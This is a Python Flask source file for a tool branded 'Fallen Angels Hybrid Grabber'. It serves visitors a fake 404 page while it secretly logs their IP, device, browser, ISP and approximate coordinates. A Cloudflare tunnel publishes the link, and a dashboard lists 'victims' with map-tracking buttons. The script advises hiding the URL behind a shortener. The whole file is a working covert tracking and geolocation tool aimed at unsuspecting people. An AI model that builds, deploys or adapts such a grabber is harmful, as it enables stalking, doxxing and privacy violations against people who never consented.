import os
import subprocess
import threading
import re
import requests
import shutil
from datetime import datetime
from flask import Flask, request, render_template_string
from colorama import init

init(autoreset=True)
app = Flask(__name__)

PORTA = 8080
ARQUIVO_LOGS = "fallen_db.txt"
API_IP = "http://ip-api.com/json/"
CAMPOS = "66846719"

vitimas = []
ips_capturados = set()

# se vc quiser mudar a cor do abnnere da russia so mudar aqui seu fldp
WHITE = "\033[97m"
BLUE  = "\033[34m"
RED   = "\033[31m"
GRAY  = "\033[90m"
CYAN  = "\033[36m"
RESET = "\033[0m"
BOLD  = "\033[1m"


DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>FALLEN ANGELS | INTELLIGENCE SERVICE</title>
    <meta http-equiv="refresh" content="10">
    <style>
        :root { --r-white: #ffffff; --r-blue: #0039a6; --r-red: #d52b1e; --bg: #0b0b0d; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', 'Segoe UI', sans-serif; }
        body { background: var(--bg); color: #e0e0e0; padding: 40px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { border-bottom: 2px solid #1a1a1a; padding-bottom: 20px; margin-bottom: 40px; display: flex; justify-content: space-between; align-items: center; }
        .header h1 { letter-spacing: 3px; font-weight: 800; text-transform: uppercase; font-size: 22px; }
        .header span { color: var(--r-blue); }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 25px; }
        .card { background: #121214; border-radius: 8px; border: 1px solid #1f1f23; padding: 25px; position: relative; transition: 0.3s; }
        .card:hover { border-color: var(--r-blue); transform: translateY(-3px); }
        .flag-strip { position: absolute; top: 0; left: 0; width: 100%; height: 4px; display: flex; border-radius: 8px 8px 0 0; overflow: hidden; }
        .f-w { background: white; width: 33.3%; } .f-b { background: var(--r-blue); width: 33.4%; } .f-r { background: var(--r-red); width: 33.3%; }
        .card-top { display: flex; justify-content: space-between; font-size: 11px; color: #555; margin-bottom: 20px; font-weight: bold; }
        .ip-display { font-size: 26px; color: #fff; font-family: 'Consolas', monospace; margin-bottom: 15px; }
        .info-box { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; font-size: 13px; border-top: 1px solid #1a1a1a; padding-top: 15px; }
        .info-label { color: #444; font-size: 10px; font-weight: bold; text-transform: uppercase; margin-bottom: 2px; }
        .info-val { color: #bbb; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .btn-track { display: block; margin-top: 25px; background: #1a1a1c; border: 1px solid #333; color: #fff; text-align: center; padding: 12px; text-decoration: none; border-radius: 4px; font-size: 12px; font-weight: bold; transition: 0.3s; }
        .btn-track:hover { background: var(--r-blue); border-color: var(--r-blue); }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>FALLEN <span>ANGELS</span></h1>
        </div>
        <div class="grid">
            {% for c in capturas[::-1] %}
            <div class="card">
                <div class="flag-strip"><div class="f-w"></div><div class="f-b"></div><div class="f-r"></div></div>
                <div class="card-top"><span>SESSION #{{ loop.index }}</span> <span>{{ c.hora }}</span></div>
                <div class="ip-display">{{ c.ip }}</div>
                <div class="info-box">
                    <div><p class="info-label">Cidade/Região</p><p class="info-val">{{ c.cidade }}, {{ c.estado }}</p></div>
                    <div><p class="info-label">País</p><p class="info-val">{{ c.pais }}</p></div>
                    <div><p class="info-label">Dispositivo</p><p class="info-val">{{ c.dispositivo }}</p></div>
                    <div><p class="info-label">Provedor</p><p class="info-val">{{ c.isp }}</p></div>
                    <div><p class="info-label">Conexão</p><p class="info-val">{{ c.tipo }}</p></div>
                    <div><p class="info-label">Browser</p><p class="info-val">{{ c.browser }}</p></div>
                </div>
                <a href="https://www.google.com/maps?q={{ c.lat }},{{ c.lon }}" target="_blank" class="btn-track">ABRIR RASTREAMENTO</a>
            </div>
            {% endfor %}
        </div>
    </div>
</body>
</html>
"""

FAKE_404_HTML = """
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at localhost Port 80</address>
</body></html>
"""

def salvar_log_txt(dados):
    with open(ARQUIVO_LOGS, "a", encoding="utf-8") as f:
        f.write(f"{'='*50}\n")
        f.write(f"DATA/HORA: {dados['hora']}\n")
        f.write(f"IP: {dados['ip']}\n")
        f.write(f"LOCAL: {dados['cidade']}, {dados['estado']}, {dados['pais']}\n")
        f.write(f"DISPOSITIVO: {dados['dispositivo']}\n")
        f.write(f"PROVEDOR: {dados['isp']}\n")
        f.write(f"COORDENADAS: {dados['lat']}, {dados['lon']}\n")
        f.write(f"{'='*50}\n\n")

def extrair_dispositivo(ua):
    if "iPhone" in ua: return "iPhone (iOS)"
    if "Android" in ua:
        match = re.search(r'Android\s+[\d\.]+;\s+([^;]+)', ua)
        return match.group(1) if match else "Android Device"
    if "Windows" in ua: return "Windows PC"
    if "Macintosh" in ua: return "MacOS Device"
    return "Unknown"

def extrair_browser(ua):
    if "Chrome" in ua: return "Chrome"
    if "Firefox" in ua: return "Firefox"
    if "Safari" in ua: return "Safari"
    return "Browser"

def pega_dados(ip):
    try:
        r = requests.get(f"{API_IP}{ip}?fields={CAMPOS}", timeout=10)
        return r.json()
    except: return None

@app.route('/')
def principal():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    ua = request.headers.get('User-Agent')

    if ip not in ips_capturados:
        agora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        d = pega_dados(ip)
        if d:
            entry = {
                "ip": ip, "hora": agora, "cidade": d.get('city'), 
                "estado": d.get('regionName'), "pais": d.get('country'),
                "isp": d.get('isp'), "lat": d.get('lat'), "lon": d.get('lon'),
                "tipo": "Mobile Data" if d.get('mobile') else "Broadband",
                "dispositivo": extrair_dispositivo(ua),
                "browser": extrair_browser(ua)
            }
            vitimas.append(entry)
            ips_capturados.add(ip)
            salvar_log_txt(entry) # Salva na pasta txt
            print(f"    {BLUE}[+]{WHITE} IP CAPTURADO: {BOLD}{ip}")

  
    return render_template_string(FAKE_404_HTML), 404

@app.route('/logs')
def ver_logs():
    return render_template_string(DASHBOARD_HTML, capturas=vitimas)

def banner_fallen():
    os.system('cls' if os.name == 'nt' else 'clear')
    columns = shutil.get_terminal_size().columns
    art = [
        "███████╗ █████╗ ██╗     ██╗     ███████╗███╗   ██╗",
        "██╔════╝██╔══██╗██║     ██║     ██╔════╝████╗  ██║",
        "█████╗  ███████║██║     ██║     █████╗  ██╔██╗ ██║",
        "██╔══╝  ██╔══██║██║     ██║     ██╔══╝  ██║╚██╗██║",
        "██║     ██║  ██║███████╗███████╗███████╗██║ ╚████║",
        "╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═══╝"
    ]
    print("\n")
    for i, line in enumerate(art):
        if i <= 1: color = WHITE
        elif i <= 3: color = BLUE
        else: color = RED
        print(f"{BOLD}{color}{line.center(columns)}")

    print(f"\n{GRAY}" + ("━" * 50).center(columns))
    
    group_info = f"{WHITE}GROUP: {RED}Fallen Angels {WHITE}&  CORE: {RED}Hybrid Grabber"
    author_info = f"{WHITE}AUTHOR: {BLUE}التعليم {WHITE}& {BLUE}Miranha.exe"
    
    print(BOLD + group_info.center(columns + 10))
    print(BOLD + author_info.center(columns + 10))
    print(f"{GRAY}" + ("━" * 50).center(columns) + "\n")

def sobe_tunnel():
    print(f"   {BLUE}[*]{WHITE} Abrindo túnel cloudflare...")
    cmd = f"npx cloudflared tunnel --url http://127.0.0.1:{PORTA}"
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

    for line in iter(proc.stdout.readline, ''):
        if "trycloudflare.com" in line:
            link = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
            if link:
                url = link.group(0)
                print(f"\n   {WHITE}[ + ]URL attack  : {CYAN}{url}")
                print(f"   {WHITE}[ + ]PAINEL logs   : {CYAN}{url}/logs")
                print(f"   {WHITE}[ ! ]Dica: Use um encurtador para esconder a URL\n")
                break

if __name__ == '__main__':
    banner_fallen()
    threading.Thread(target=sobe_tunnel, daemon=True).start()
    app.run(host='0.0.0.0', port=PORTA, debug=False)